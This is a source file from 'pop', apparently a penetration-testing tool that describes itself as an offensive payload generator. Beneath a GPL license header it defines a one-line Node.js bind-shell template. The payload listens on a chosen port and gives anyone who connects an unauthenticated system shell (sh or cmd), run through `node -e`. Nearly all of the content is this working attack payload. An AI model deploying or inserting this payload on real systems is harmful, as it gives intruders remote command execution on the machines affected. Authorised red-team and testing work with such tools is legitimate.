#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

USAGE = 'port'
NARGS = [1, 1]
LANG = 'js'
EXEC = '''
node -e "PAYLOAD"
'''


pl = '''
(()=>{(VAR0=require('net').createServer((VAR1)=>{VAR2=require('child_process').spawn(process.platform.includes('win')?'cmd':'sh');VAR1.pipe(VAR2.stdin);VAR2.stdout.pipe(VAR1);VAR2.stderr.pipe(VAR1);VAR1.on('end',()=>{VAR0.close()})})).listen(ARG1)})()
'''
